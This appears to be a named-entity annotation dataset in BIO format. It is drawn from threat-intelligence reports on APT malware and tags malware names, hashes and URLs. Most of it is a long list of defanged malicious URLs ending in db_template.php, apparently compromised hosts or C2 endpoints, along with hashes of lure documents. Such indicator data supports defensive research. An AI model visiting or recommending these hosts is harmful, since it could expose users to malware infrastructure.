:	O
Several	O
instances	O
of	O
character	O
replacement	O
and	O
string	O
reversing	O
techniques	O
(	O
Figure	O
10	O
)	O
make	O
analysis	O
difficult	O
.	O

Thanks	O
to	O
Marcia	O
Hofmann	O
and	O
the	O
Electronic	O
Frontier	O
Foundation	O
(	O
EFF	O
)	O
.	O

For	O
targets	O
in	O
which	O
a	O
victim	O
is	O
seated	O
in	O
an	O
organization	O
that	O
has	O
an	O
SSL	O
Inspection	O
device	O
,	O
the	O
malware	O
takes	O
this	O
additional	O
step	O
to	O
further	O
hide	O
its	O
network	O
activity	O
.	O

createRandomSymbols	O
:	O
]	O

Chafer	O
's	O
recent	O
activities	O
indicate	O
that	O
the	O
group	O
remains	O
highly	O
active	O
,	O
is	O
continuing	O
to	O
hone	O
its	O
tools	O
and	O
tactics	O
,	O
and	O
has	O
become	O
more	O
audacious	O
in	O
its	O
choice	O
of	O
targets	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
logic	O
used	O
to	O
extract	O
the	O
URL	O
and	O
the	O
command	O
strings	O
,	O
in	O
the	O
below	O
screen	O
shot	O
the	O
extracted	O
command	O
string	O
is	O
stored	O
in	O
the	O
variable	O
ServerTask1Permission	O
.	O

The	O
samples	O
were	O
Word	O
documents	O
with	O
a	O
macro	O
version	O
of	O
DustySky	B-malware.drop
.	O

Let	O
's	O
try	O
to	O
imagine	O
what	O
the	O
driver	O
creation	O
process	O
looks	O
like	O
.	O

ACTIONABLE	O
INTELLIGENCE	O

HKEY_CLASSES_ROOTHwp.Document.7shellopencommand	O
HKEY_CLASSES_ROOTHwp.Document.8shellopencommand	O

Updated	O
AF	O
MOD	O
contract	O
-	O
Jan	O
2018.exe	O
remove_pw_Reschedule	O
of	O
CISD	O
Regular	O
Meeting.exe	O
Sorchornor_with_PM_-_Sep_2017.exe	O
20170905-Evaluation	O
Table.xls.exe	O
CV_LeHoangThing.doc.exe.Fake	O
résumé	O
(	O
CV	O
)	O
documents	O
were	O
also	O
seen	O
in	O
Canada	O
.	O

109	O
,	O
'	O
NEWCT2	B-malware.backdoor
'	O

We	O
have	O
not	O
yet	O
seen	O
the	O
Moafee	B-malware.infosteal
group	O
use	O
this	O
tool	O
.	O

An	O
example	O
is	O
shown	O
in	O
Figure	O
3	O
.	O

The	O
data	O
obtained	O
and	O
the	O
available	O
information	O
about	O
the	O
drivers	O
used	O
in	O
Duqu	B-malware.infosteal
(	O
see	O
The	O
Mystery	O
of	O
Duqu	B-malware.infosteal
,	O
Part	O
One	O
and	O
Part	O
Two	O
)	O
can	O
be	O
summed	O
up	O
in	O
the	O
table	O
below	O
:	O

The	O
following	O
table	O
describes	O
the	O
role	O
of	O
each	O
module	O
:	O
Module	O
Name	O
Purpose	O
Penny	O
Takes	O
a	O
screenshot	O
of	O
the	O
infected	O
machine	O
and	O
sends	O
it	O
to	O
the	O
server	O
Wolowitz_Helberg	B-malware.unknown
Enumerates	O
running	O
processes	O
,	O
saves	O
their	O
names	O
and	O
their	O
IDs	O
in	O
'	O
sat.txt	O
'	O
and	O
sends	O
the	O
file	O
to	O
the	O
server	O
Celal_Al	B-malware.unknown
Sends	O
a	O
list	O
of	O
documents	O
with	O
certain	O
extensions	O
.	O

To	O
allow	O
the	O
VNC	O
session	O
to	O
connect	O
,	O
the	O
current	O
network	O
socket	O
WSAProtcol_Info	O
structure	O
is	O
written	O
to	O
a	O
named	O
pipe	O
prior	O
to	O
calling	O
zxFunction001	O
.	O

The	O
core	O
of	O
the	O
FireEye	O
platform	O
is	O
a	O
virtual	O
execution	O
engine	O
,	O
complemented	O
by	O
dynamic	O
threat	O
intelligence	O
,	O
to	O
identify	O
and	O
block	O
cyber	O
attacks	O
in	O
real	O
time	O
.	O

@	O
@	O
d81596a9	O
ferry	O
0	O
dir	O
5	O

We	O
assess	O
that	O
when	O
Iranian	O
cyber	O
operators	O
respond	O
to	O
the	O
U.S.	O
withdrawal	O
from	O
the	O
JCPOA	O
that	O
the	O
operations	O
will	O
be	O
staffed	O
and	O
executed	O
by	O
capable	O
,	O
but	O
less	O
trusted	O
contractors	O
.	O

The	O
attackers	O
modified	O
their	O
tool	O
.	O

The	O
control	O
measures	O
established	O
by	O
the	O
developer	O
to	O
limit	O
the	O
use	O
and	O
proliferation	O
of	O
the	O
30.apk	B-malware.backdoor
application	O
,	O
coupled	O
with	O
its	O
unique	O
purpose	O
,	O
make	O
its	O
broad	O
distribution	O
on	O
the	O
Android	O
store	O
improbable	O
.	O

KEY	O
FINDINGS	O

Initial	O
state	O
of	O
substitution	O
table	O
stable_var_41C	O

<	O
?	O
xml	O
version='1.0	O
'	O
encoding='UTF-8	O
'	O
standalone='yes	O
'	O
?	O

The	O
screenshot	O
illustrates	O
only	O
a	O
subset	O
of	O
the	O
data	O
being	O
tracked	O
by	O
HBGary	O
,	O
and	O
sensitive	O
information	O
has	O
been	O
redacted	O
.	O

Domain	O
Details	O
VirusTotal	B-url.normal

Attackers	O
are	O
banking	O
on	O
network	O
vulnerabilities	O
and	O
inherent	O
weaknesses	O
to	O
facilitate	O
massive	O
malware	O
attacks	O
,	O

In	O
contrast	O
,	O
here	O
is	O
an	O
extracted	O
PoisonIvy	O
configuration	O
block	O
from	O
a	O
'	O
Moafee	B-malware.infosteal
'	O
instance	O

games-playbox[.]com	B-url.cncsvr
worldvoicetrip[.]com	B-url.cncsvr

If	O
the	O
backdoor	O
finds	O
no	O
valid	O
pair	O
of	O
C	O
&	O
C	O
address	O
and	O
port	O
number	O
delimited	O
with	O
the	O
'	O
:	O
'	O
character	O
,	O
it	O
quits	O
.	O

Figure	O
2	O
displays	O
another	O
APT32	B-malware.infosteal
lure	O
that	O
used	O
a	O
convincing	O
image	O
of	O
a	O
fake	O
Windows	O
error	O
message	O
instructing	O
the	O
recipient	O
to	O
enable	O
content	O
to	O
properly	O
display	O
document	O
font	O
characters	O
.	O

These	O
modules	O
are	O
used	O
for	O
communication	O
with	O
the	O
C	O
&	O
C	O
server	O
,	O
encryption	O
and	O
encoding	O
and	O
-	O
most	O
importantly	O
-	O
for	O
data	O
exfiltration	O
and	O
espionage	O
.	O

SHA1-1	O
Filename	O
ESET	O
Detection	O
Name	O

31	O
.	O

Sarah	O
and	O
Fred	O

Fig	O
4	O
.	O

Talos	O
receives	O
samples	O
from	O
over	O
100	O
external	O
feeds	O
ranging	O
from	O
anti-malware	O
companies	O
to	O
research	O
centers	O
,	O
while	O
the	O
AMP	O
dataset	O

x509	O
fingerprint	O

Appendix	O
C	O
:	O
Moafee	B-malware.infosteal
and	O
DragonOK	B-malware.infosteal
Clusters	O
.........................................................................................................................................................................................	O
23	O

On	O
3rd	O
February	O
2017	O
,	O
researchers	O
at	O
badcyber.com	B-url.normal
released	O
an	O
article	O
that	O
detailed	O
a	O
series	O
of	O
attacks	O
directed	O
at	O
Polish	O
financial	O
institutions	O
.	O

Commands	O
with	O
a	O
?	O

The	O
implant	O
does	O
not	O
conduct	O
financial	O
transactions	O
;	O
rather	O
it	O
is	O
a	O
channel	O
into	O
the	O
victim	O
's	O
environment	O
,	O
in	O
which	O
further	O
stages	O
of	O
implants	O
can	O
be	O
deployed	O
for	O
financial	O
reconnaissance	O
.	O

Updated	O
the	O
detection	O
names	O
on	O
January	O
25	O
,	O
2018	O
,	O
9:47	O
PM	O
PDT	O

If	O
there	O
are	O
no	O
queued	O
packets	O
,	O
PCC_CMD	O
:	O
:ReadWaitingData	O
will	O
perform	O
a	O
queue	O
of	O
the	O
console	O
output	O
pipe	O
for	O
the	O
remote	O
shell	O
process	O
(	O
if	O
it	O
is	O
active	O
)	O
;	O
the	O
function	O
will	O
also	O
attempt	O
to	O
read	O
the	O
entirety	O
of	O
the	O
waiting	O
data	O
,	O
which	O
then	O
becomes	O
the	O
payload	O
of	O
a	O
PacketHeader	O
/	O
PCCCMDPacketHeader	O

.doc	O
Turkey	O
009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0	B-hash
18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6	B-hash
idrbt.doc	O
India	O
Türkiye	O
Cumhuriyeti	O
Kimlik	O
Kartı.doc	O
Turkey	O
Turkish	O
Armed	O
Forces.doc	O
3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb	B-hash
9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c	B-hash
Turkish	O
Armed	O
Forces.doc	O
na.gov.pk.doc	O
Turkey	O
Pakistan	O
3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115	B-hash
MVD-FORM-1800.doc	O
Tajikistan	O
cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88	B-hash
KEGM-CyberAttack.doc	O
Turkey	O
1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942	B-hash
IL-1801.doc	O
aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627	B-hash
kiyiemniyeti.doc	O
Turkey	O
Turkey	O
93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84	B-hash
TCELL-S1-M.doc	O
Tajikistan	O
c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9	B-hash
egm-1.doc	O
Turkey	O
2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13	B-hash
Connectel	O
.pk.doc	O
Pakistan	O
18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd	B-hash
gÃŸvenlik_yÃœnergesi_.doc	O
Turkey	O
153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58	B-hash
MIT.doc	O
Turkey	O
d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025	B-hash
Gvenlik	O
Ynergesi.doc	O
Turkey	O
af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102	B-hash
Gvenlik	O
Ynergesi.doc	O
Turkey	O
5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af	B-hash
Turkey	O
5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af	B-hash
3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c	B-hash
Anadolu	O
GÃ	O
neydoÄŸu	O
Projesinde	O
.doc	O
Turkey	O
Turkey	O
hxxp://alessandrofoglino[.]com//db_template.php	B-url.unknown
hxxp://www.easy-home-sales[.]co.za//db_template.php	B-url.unknown
hxxp://www.almaarefut[.]com/admin/db_template.php	B-url.unknown
hxxp://chinamall[.]co.za//db_template.php	B-url.unknown
hxxp://amesoulcoaching[.]com//db_template.php	B-url.unknown
hxxp://www.antigonisworld[.]com/wp-includes/db_template.php	B-url.unknown
hxxps://anbinni.ba/wp-admin/db_template.php	B-url.unknown
hxxp://arctistrade[.]de/wp/db_template.php	B-url.unknown
hxxp://aianalytics[.]ie//db_template.php	B-url.unknown
hxxp://www.gilforsenate[.]com//db_template.php	B-url.unknown
hxxp://mgamule[.]co.za/oldweb/db_template.php	B-url.unknown
hxxp://chrisdejager-attorneys[.]co.za//db_template.php	B-url.unknown
hxxp://alfredocifuentes[.]com//db_template.php	B-url.unknown
hxxp://alxcorp[.]com//db_template.php	B-url.unknown
hxxps://www.aircafe24[.]com//db_template.php	B-url.unknown
hxxp://agencereferencement.be/wp-admin/db_template.php	B-url.unknown
hxxp://americanlegacies[.]org/webthed_ftw/db_template.php	B-url.unknown
hxxps://aloefly[.]net//db_template.php	B-url.unknown
hxxp://www.duotonedigital[.]co.za//db_template.php	B-url.unknown
hxxp://architectsinc[.]net//db_template.php	B-url.unknown
hxxp://www.tanati[.]co.za//db_template.php	B-url.unknown
hxxp://emware[.]co.za//db_template.php	B-url.unknown
hxxp://breastfeedingbra[.]co.za//db_template.php	B-url.unknown
hxxp://alhidayahfoundation[.]co[.]uk/category/db_template.php	B-url.unknown
hxxp://cashforyousa[.]co.za//db_template.php	B-url.unknown
hxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.php	B-url.unknown
hxxp://antjetaubert[.]de//db_template.php	B-url.unknown
hxxp://hesterwebber[.]co.za//db_template.php	B-url.unknown
hxxp://fickstarelectrical[.]co.za//db_template.php	B-url.unknown
hxxp://alex-frost[.]com/assets/db_template.php	B-url.unknown
hxxps://americanbrasil[.]com.br//db_template.php	B-url.unknown
hxxps://aileeshop[.]com//db_template.php	B-url.unknown
hxxps://annodle[.]com//db_template.php	B-url.unknown
hxxp://goldeninstitute[.]co.za/contents/db_template.php	B-url.unknown
hxxp://ednpk[.]com//db_template.php	B-url.unknown
hxxp://www.arabiccasinochoice[.]com//db_template.php	B-url.unknown
hxxp://proeventsports[.]co.za//db_template.php	B-url.unknown
hxxp://glenbridge[.]co.za//db_template.php	B-url.unknown
hxxp://berped[.]co.za//db_template.php	B-url.unknown
hxxp://best-digital-slr-cameras[.]com//db_template.php	B-url.unknown
hxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.php	B-url.unknown
hxxp://www.alpacal[.]com//db_template.php	B-url.unknown
hxxps://www.alakml[.]com/wp-admin/db_template.php	B-url.unknown
hxxp://ar-rihla[.]com//db_template.php	B-url.unknown
hxxp://appsvoice[.]info//db_template.php	B-url.unknown
hxxp://www.bashancorp[.]co.za//db_template.php	B-url.unknown
hxxp://alexanderbecker[.]net/services/db_template.php	B-url.unknown
hxxp://visionclinic.co.ls/visionclinic/db_template.php	B-url.unknown
hxxps://www.angelesrevista[.]com//db_template.php	B-url.unknown
hxxps://www.antojoentucocina[.]com//db_template.php	B-url.unknown
hxxp://apollonweb[.]com//db_template.php	B-url.unknown
hxxps://www.alphapixa[.]com//db_template.php	B-url.unknown
hxxp://capitalradiopetition[.]co.za//db_template.php	B-url.unknown
hxxp://www.generictoners[.]co.za//db_template.php	B-url.unknown
hxxps://alnahdatraining[.]com//db_template.php	B-url.unknown
hxxps://albousala[.]com//db_template.php	B-url.unknown
hxxps://www.dopetroleum[.]com//db_template.php	B-url.unknown
hxxp://bios-chip[.]co.za//db_template.php	B-url.unknown
hxxp://www.crissamconsulting[.]co.za//db_template.php	B-url.unknown
hxxp://capriflower[.]co.za//db_template.php	B-url.unknown
hxxp://www.dingaanassociates[.]co.za//db_template.php	B-url.unknown
hxxp://indiba-africa[.]co.za//db_template.php	B-url.unknown
hxxp://verifiedseller[.]co.za/js/db_template.php	B-url.unknown
hxxps://www.buraqlubricant[.]com//db_template.php	B-url.unknown
hxxp://aqarco[.]com/wp-admin/db_template.php	B-url.unknown
hxxp://allaboutblockchain[.]net//db_template.php	B-url.unknown
hxxp://www.amexcars[.]info/tpl/db_template.php	B-url.unknown
hxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.php	B-url.unknown
hxxp://bakron[.]co.za//db_template.php	B-url.unknown
hxxp://gsnconsulting[.]co.za//db_template.php	B-url.unknown
hxxp://vumavaluations[.]co.za//db_template.php	B-url.unknown
hxxp://heritagetravelmw[.]com//db_template.php	B-url.unknown
hxxp://ampvita[.]com//db_template.php	B-url.unknown
hxxp://ahero-resource-center[.]org/administrator/db_template.php	B-url.unknown
hxxps://arbulario[.]com//db_template.php	B-url.unknown
hxxp://havilahglo[.]co.za/wpscripts/db_template.php	B-url.unknown
hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php	B-url.unknown
hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php	B-url.unknown
hxxp://delectronics[.]com[.]pk//db_template.php	B-url.unknown
hxxp://antucomp[.]com//db_template.php	B-url.unknown
hxxp://advocatetn[.]com/font-awesome/fonts/db_template.php	B-url.unknown
hxxps://amooy[.]com/webservice/db_template.php	B-url.unknown
hxxp://www.harmonyguesthouse[.]co.za//db_template.php	B-url.unknown
hxxp://alanrori[.]com//db_template.php	B-url.unknown
hxxp://algarvesup[.]com//db_template.php	B-url.unknown
hxxp://desirablehair[.]co.za//db_template.php	B-url.unknown
hxxp://comsip[.]org.mw//db_template.php	B-url.unknown
hxxp://jdcorporate[.]co.za/catalog/db_template.php	B-url.unknown
hxxp://andrewfinnburhoe[.]com//db_template.php	B-url.unknown
hxxp://anyeva[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://www.agenceuhd[.]com//db_template.php	B-url.unknown
hxxp://host4unix[.]net/host24new/db_template.php	B-url.unknown
hxxp://www.altaica[.]ca/wordpress/db_template.php	B-url.unknown
hxxp://www.allbuyer[.]co[.]uk//db_template.php	B-url.unknown
hxxp://jvpsfunerals[.]co.za//db_template.php	B-url.unknown
hxxp://immaculatepainters[.]co.za//db_template.php	B-url.unknown
hxxp://tcpbereka[.]co.za/js/db_template.php	B-url.unknown
hxxp://clientcare.co.ls//db_template.php	B-url.unknown
hxxp://investaholdings[.]co.za/htc/db_template.php	B-url.unknown
hxxp://www.amjobs[.]co[.]uk//db_template.php	B-url.unknown
hxxp://www.agirlgonewine[.]com/store/db_template.php	B-url.unknown
hxxp://findinfo-more[.]com//db_template.php	B-url.unknown
hxxp://asgen[.]org//db_template.php	B-url.unknown
hxxp://alphasalesrecruitment[.]com//db_template.php	B-url.unknown
hxxp://irshadfoundation[.]co.za//db_template.php	B-url.unknown
hxxp://analternatif[.]com/includes/db_template.php	B-url.unknown
hxxp://arbruisseau[.]com/profiles/db_template.php	B-url.unknown
hxxp://ladiescircle[.]co.za//db_template.php	B-url.unknown
hxxp://all-reseller[.]com/zzz_backup/db_template.php	B-url.unknown
hxxp://alcatrazmoon[.]com/images/db_template.php	B-url.unknown
hxxp://www.alcalumni[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://aniljoseph[.]com/servermon/db_template.php	B-url.unknown
hxxp://alwake3press[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://www.hfhl[.]org.ls/habitat/db_template.php	B-url.unknown
hxxp://alcafricanos[.]com/slsmonographs/db_template.php	B-url.unknown
hxxps://agapeencounter[.]org//db_template.php	B-url.unknown
hxxp://apobiomedix[.]ca//db_template.php	B-url.unknown
hxxp://anythinglah[.]info//db_template.php	B-url.unknown
hxxp://aniroleplay[.]net//db_template.php	B-url.unknown
hxxp://aniroleplay[.]net//db_template.php	B-url.unknown
hxxp://www.allcopytoners[.]com//db_template.php	B-url.unknown
hxxp://alphaobring[.]com//db_template.php	B-url.unknown
hxxp://www.galwayprimary[.]co.za//db_template.php	B-url.unknown
hxxp://alnuzha[.]org/en/db_template.php	B-url.unknown
hxxps://ancient-wisdoms[.]com//db_template.php	B-url.unknown
hxxp://amazingenergysavings[.]net//db_template.php	B-url.unknown
hxxp://gvs[.]com[.]pk/font-awesome/db_template.php	B-url.unknown
hxxp://geetransfers[.]co.za/font-awesome/db_template.php	B-url.unknown
hxxp://carlagrobler[.]co.za/components/db_template.php	B-url.unknown
hxxp://amazingashwini[.]com//db_template.php	B-url.unknown
hxxp://aminearserver[.]es//db_template.php	B-url.unknown
hxxp://lensofafrica[.]co.za//db_template.php	B-url.unknown
hxxp://greenacrestf[.]co.za/video/db_template.php	B-url.unknown
hxxp://www.tonaro[.]co.za//db_template.php	B-url.unknown
hxxp://alephit2[.]biz/kitzz/db_template.php	B-url.unknown
hxxp://lppaportal[.]org.ls//db_template.php	B-url.unknown
hxxp://alkousy[.]com//db_template.php	B-url.unknown
hxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.php	B-url.unknown
hxxp://fragranceoil[.]co.za//db_template.php	B-url.unknown
hxxp://www.eloquent[.]co.za/nweb2/db_template.php	B-url.unknown
hxxp://chrishanicdc[.]org/wpimages/db_template.php	B-url.unknown
hxxp://ahc.me[.]uk//db_template.php	B-url.unknown
hxxp://www.britishasia-equip[.]co[.]uk//db_template.php	B-url.unknown
hxxp://always-beauty[.]ch//db_template.php	B-url.unknown
hxxps://www.ancamamara[.]com/wp-admin/db_template.php	B-url.unknown
hxxp://entracorntrading[.]co.za//db_template.php	B-url.unknown
hxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://americabr[.]com.br//db_template.php	B-url.unknown
hxxp://andrew-snyder[.]net/bootstrap/db_template.php	B-url.unknown
hxxp://signsoftime[.]co.za//db_template.php	B-url.unknown
hxxp://aperta-armis[.]org//db_template.php	B-url.unknown
hxxp://absfinancialplanning[.]co.za/images/db_template.php	B-url.unknown
hxxp://charispaarl[.]co.za//db_template.php	B-url.unknown
hxxp://indlovusecurity[.]co.za//db_template.php	B-url.unknown
hxxp://alcafricandatalab[.]com//db_template.php	B-url.unknown
hxxp://amor-clubhotels[.]com//db_template.php	B-url.unknown
hxxp://mokorotlocorporate[.]com//db_template.php	B-url.unknown
hxxp://apppriori[.]com//db_template.php	B-url.unknown
hxxp://luxconprojects[.]co.za//db_template.php	B-url.unknown
hxxp://androidphonetips[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://angel-seeds[.]com.ua/catalog/db_template.php	B-url.unknown
hxxp://angel-seeds[.]com.ua/catalog/db_template.php	B-url.unknown
hxxp://alissanicolai[.]com/assets/db_template.php	B-url.unknown
hxxps://www.amateurastronomy[.]org//db_template.php	B-url.unknown
hxxp://aiofotoevideo[.]com//db_template.php	B-url.unknown
hxxp://www.amika.hr//db_template.php	B-url.unknown
hxxp://comfortex[.]co.za/php/db_template.php	B-url.unknown
hxxp://deepgraphics[.]co.za//db_template.php	B-url.unknown
hxxps://agiledepot[.]com//db_template.php	B-url.unknown
hxxp://almatours[.]gr//db_template.php	B-url.unknown
hxxp://analystcnwang[.]com//db_template.php	B-url.unknown
hxxp://www.malboer[.]co.za/trendy1/db_template.php	B-url.unknown
hxxp://sefikengfarm.co.ls//db_template.php	B-url.unknown
hxxp://www.antirughenaturale[.]com/wp-admin/db_template.php	B-url.unknown
hxxp://passright[.]co.za//db_template.php	B-url.unknown
hxxp://seismicfactory[.]co.za//db_template.php	B-url.unknown
hxxp://alessandroalessandrini[.]it//db_template.php	B-url.unknown
hxxps://aquabsafe[.]com//db_template.php	B-url.unknown
hxxp://amatikulutours[.]com/tmp/db_template.php	B-url.unknown
hxxp://ganitis[.]gr//db_template.php	B-url.unknown
hxxp://aleenasgiftbox[.]com/admin/db_template.php	B-url.unknown
hxxps://allusdoctors[.]com/themes/db_template.php	B-url.unknown
hxxp://alainsaffel[.]com//db_template.php	B-url.unknown
hxxp://www.ariehandomri[.]com//db_template.php	B-url.unknown
hxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.php	B-url.unknown
hxxp://itengineering[.]co.za/gatewaydiamond/db_template.php	B-url.unknown
hxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.php	B-url.unknown
hxxp://www.albertamechanical[.]ca//db_template.php	B-url.unknown
hxxp://alchamel[.]info//db_template.php	B-url.unknown
hxxps://almokan[.]net/wp-includes/db_template.php	B-url.unknown
hxxp://jakobieducation[.]co.za//db_template.php	B-url.unknown
hxxps://arc-sec[.]net//db_template.php	B-url.unknown
hxxp://ldams[.]org.ls/supplies/db_template.php	B-url.unknown
hxxp://menaboracks[.]co.za/tmp/db_template.php	B-url.unknown
hxxp://www.getcord[.]co.za//db_template.php	B-url.unknown
hxxp://boardaffairs[.]com//db_template.php	B-url.unknown
hxxp://capetownway[.]co.za//db_template.php	B-url.unknown
hxxp://cloudhostdesign[.]com//db_template.php	B-url.unknown
hxxp://hartenboswaterpark[.]co.za/templates/db_template.php	B-url.unknown
hxxp://fccorp[.]co.za/php/db_template.php	B-url.unknown
hxxp://angar68[.]com//db_template.php	B-url.unknown
hxxp://www.dws-gov[.]co.za//db_template.php	B-url.unknown
hxxp://alwahahweb[.]com//db_template.php	B-url.unknown
hxxp://alwahahweb[.]com//db_template.php	B-url.unknown
hxxp://anuragcreatives[.]com//db_template.php	B-url.unknown
hxxp://embali[.]co.za//db_template.php	B-url.unknown
hxxp://albertaedmonton[.]com/widgetstyles/db_template.php	B-url.unknown
hxxp://altosdefontana[.]com//db_template.php	B-url.unknown
hxxp://airfanhydro[.]net//db_template.php	B-url.unknown
hxxps://www.alexponcet[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://agropecuariavilarica[.]com.br//db_template.php	B-url.unknown
hxxps://www.amazingbuyrd[.]com/admin/db_template.php	B-url.unknown
hxxp://cdxtrading[.]co.za//db_template.php	B-url.unknown
hxxp://interafricaconsulting[.]com/wpimages/db_template.php	B-url.unknown
hxxp://glgroup[.]co.za/images/db_template.php	B-url.unknown
hxxp://hisandherskennels[.]co.za/php/db_template.php	B-url.unknown
hxxp://alemaohost[.]com/lotosorg[.]com/db_template.php	B-url.unknown
hxxp://isibaniedu[.]co.za/admin/db_template.php	B-url.unknown
hxxp://dianakleyn[.]co.za/layouts/db_template.php	B-url.unknown
hxxp://themotoringcalendar[.]co.za//db_template.php	B-url.unknown
hxxp://www.loansonhomes[.]co.za//db_template.php	B-url.unknown
hxxp://edgesecurity[.]co.za/js/db_template.php	B-url.unknown
hxxp://highschoolsuperstar[.]co.za/files/db_template.php	B-url.unknown
hxxp://www.ambientproperty[.]com//db_template.php	B-url.unknown
hxxp://animationshowreel[.]co.il//db_template.php	B-url.unknown
hxxp://cafawelding[.]co.za/font-awesome/db_template.php	B-url.unknown
hxxp://apalawyers.pt//db_template.php	B-url.unknown
hxxp://www.edesignz[.]co.za//db_template.php	B-url.unknown
hxxp://centuryacademy[.]co.za/css/db_template.php	B-url.unknown
hxxps://ambyenta.hr//db_template.php	B-url.unknown
hxxp://ceramica[.]co.za//db_template.php	B-url.unknown
hxxp://www.alfredoposada[.]com//db_template.php	B-url.unknown
hxxp://anastasovsworkshop[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://allisonplumbing[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://eastrandmotorlab[.]co.za/fleet/db_template.php	B-url.unknown
hxxp://angelsongroup[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://www.mikimaths[.]com//db_template.php	B-url.unknown
hxxp://hjb-racing[.]co.za/htdocs/db_template.php	B-url.unknown
hxxp://anotherpartofme[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://www.andreabelfi[.]com//db_template.php	B-url.unknown
hxxp://www.iancullen[.]co.za//db_template.php	B-url.unknown
hxxp://alaskamaterials[.]com//db_template.php	B-url.unknown
hxxp://jeanetteproperties[.]co.za//db_template.php	B-url.unknown
hxxp://www.digitalmedia[.]co.za//db_template.php	B-url.unknown
hxxp://www.rejoicetheatre[.]com//db_template.php	B-url.unknown
hxxp://www.rejoicetheatre[.]com//db_template.php	B-url.unknown
hxxps://alterwebhost[.]com//db_template.php	B-url.unknown
hxxp://bc-u[.]co[.]uk//db_template.php	B-url.unknown
hxxp://dpscdgkhan.edu[.]pk/shopping/db_template.php	B-url.unknown
hxxp://edgeforensic[.]co.za//db_template.php	B-url.unknown
hxxp://willpowerpos[.]co.za//db_template.php	B-url.unknown
hxxp://antrismode[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://colenesphotography[.]co.za/modules/db_template.php	B-url.unknown
hxxp://anthaigroup.vn//db_template.php	B-url.unknown
hxxps://alphainvestors[.]com.au//db_template.php	B-url.unknown
hxxps://aliart[.]nl//db_template.php	B-url.unknown
hxxps://allmantravel[.]com/thumbs/db_template.php	B-url.unknown
hxxp://fbrvolume[.]co.za//db_template.php	B-url.unknown
hxxp://amordegato[.]es/storefront/db_template.php	B-url.unknown
hxxp://agylub[.]com//db_template.php	B-url.unknown
hxxp://www.khotsonglodge.co.ls//db_template.php	B-url.unknown
hxxp://ampli5yd[.]com//db_template.php	B-url.unknown
hxxps://animeok[.]co.il//db_template.php	B-url.unknown
hxxps://arbeidsrechtcentrum[.]nl//db_template.php	B-url.unknown
hxxp://erniecommunications[.]co.za/js/db_template.php	B-url.unknown
hxxp://promechtransport[.]co.za/scripts/db_template.php	B-url.unknown
hxxp://centuriongsd[.]co.za//db_template.php	B-url.unknown
hxxp://www.agencesylvieleclerc[.]com//db_template.php	B-url.unknown
hxxp://delcom[.]co.za//db_template.php	B-url.unknown
hxxps://aleoestudio[.]com/gallonature/db_template.php	B-url.unknown
hxxp://oftheearthphotography[.]com/www/db_template.php	B-url.unknown
hxxp://h-dubepromotions[.]co.za//db_template.php	B-url.unknown
hxxp://www.alessioborzuola[.]com/downloads/db_template.php	B-url.unknown
hxxp://crystaltidings[.]co.za//db_template.php	B-url.unknown
hxxp://funeralbusinesssolution[.]com/email_template/db_template.php	B-url.unknown
hxxp://funisalodge[.]co.za/data1/db_template.php	B-url.unknown
hxxp://experttutors[.]co.za//db_template.php	B-url.unknown
hxxps://www[.]cartridgecave[.]co.za//db_template.php	B-url.unknown
hxxp://ecs-consult[.]com//db_template.php	B-url.unknown
hxxp://www.animationinisrael[.]org/tmp_images/db_template.php	B-url.unknown
hxxp://gideonitesprojects[.]com//db_template.php	B-url.unknown
hxxp://hybridauto[.]co.za/photography/db_template.php	B-url.unknown
hxxp://africanpixels.zar.cc//db_template.php	B-url.unknown
hxxp://ryanchristiefurniture[.]co.za//db_template.php	B-url.unknown
hxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.php	B-url.unknown
hxxp://almeriahotelja[.]com/dk/db_template.php	B-url.unknown
hxxp://al3abflash[.]biz//db_template.php	B-url.unknown
hxxp://al3abflash[.]biz//db_template.php	B-url.unknown
hxxp://www.fun4kidz[.]co.za//db_template.php	B-url.unknown
hxxp://alsharhanstore[.]com//db_template.php	B-url.unknown
hxxp://www[.]infratechconsulting[.]com//db_template.php	B-url.unknown
hxxp://algihad[.]com/assets/db_template.php	B-url.unknown
hxxp://americanwestmedia[.]com//db_template.php	B-url.unknown
